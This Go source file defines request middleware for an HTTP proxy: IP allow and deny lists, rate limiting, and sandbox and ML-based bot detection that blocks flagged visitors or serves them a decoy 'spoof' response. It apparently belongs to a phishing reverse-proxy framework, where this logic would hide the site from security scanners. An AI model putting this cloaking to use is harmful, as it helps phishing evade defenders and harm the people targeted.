package core

import (
	"crypto/tls"
	"net/http"

	"github.com/elazarl/goproxy"
)

// ProxyMiddleware interface for request handling chain
type ProxyMiddleware interface {
	// HandleRequest processes the request. Returns modified request/response, and a bool indicating if handling should continue (false = stop/block).
	Handle(req *http.Request, ctx *goproxy.ProxyCtx, p *HttpProxy) (*http.Request, *http.Response, bool)
}

// IPMiddleware handles IP extraction, Blacklist, and Whitelist
type IPMiddleware struct{}

func (m *IPMiddleware) Handle(req *http.Request, ctx *goproxy.ProxyCtx, p *HttpProxy) (*http.Request, *http.Response, bool) {
	// Extract Real IP
	from_ip := p.getRealIP(req)
	ctx.UserData.(*ProxySession).RemoteIP = from_ip

	// Whitelist Check
	if p.cfg.IsWhitelistEnabled() && p.wl != nil {
		if !p.wl.IsWhitelisted(from_ip) {
			r, resp := p.blockRequest(req)
			return r, resp, false
		}
	}

	// Blacklist Check
	if p.cfg.GetBlacklistMode() != "off" {
		if p.bl.IsBlacklisted(from_ip) {
			r, resp := p.blockRequest(req)
			return r, resp, false
		}
	}

	return req, nil, true
}

// TrafficMiddleware handles connection rate limiting
type TrafficMiddleware struct{}

func (m *TrafficMiddleware) Handle(req *http.Request, ctx *goproxy.ProxyCtx, p *HttpProxy) (*http.Request, *http.Response, bool) {
	if p.trafficShaper != nil {
		from_ip := ctx.UserData.(*ProxySession).RemoteIP
		allowed, reason := p.trafficShaper.ShouldAllowRequest(req, from_ip)
		if !allowed {
			return req, goproxy.NewResponse(req, "text/plain", http.StatusTooManyRequests, reason), false
		}
	}
	return req, nil, true
}

// BotMiddleware handles ML and Sandbox detection
type BotMiddleware struct{}

func (m *BotMiddleware) Handle(req *http.Request, ctx *goproxy.ProxyCtx, p *HttpProxy) (*http.Request, *http.Response, bool) {
	from_ip := ctx.UserData.(*ProxySession).RemoteIP
	antibotConfig := p.cfg.GetAntibotConfig()

	// 1. Whitelist Check (Override IPs)
	if antibotConfig != nil {
		for _, allowedIP := range antibotConfig.OverrideIPs {
			if from_ip == allowedIP {
				return req, nil, true
			}
		}
	}

	isBot := false

	// Sandbox
	if p.sandboxDetector != nil {
		detection := p.sandboxDetector.Detect(req, from_ip)
		if detection.IsSandbox {
			isBot = true
		}
	}

	// ML Bot Detection
	if !isBot && p.mlDetector != nil && !p.developer {
		var tlsState *tls.ConnectionState
		if ctx.Resp != nil && ctx.Resp.TLS != nil {
			tlsState = ctx.Resp.TLS
		}

		clientID := p.getClientIdentifier(req)

		features := p.mlDetector.featureExtractor.ExtractRequestFeatures(req, tlsState, clientID)
		res, err := p.mlDetector.Detect(features, clientID)
		if err == nil && res.IsBot {
			isBot = true
		}
	}

	if isBot {
		if antibotConfig != nil && antibotConfig.Action == "spoof" {
			r, resp := p.serveSpoofResponse(req)
			return r, resp, false
		}
		// Default to block
		r, resp := p.blockRequest(req)
		return r, resp, false
	}

	return req, nil, true
}
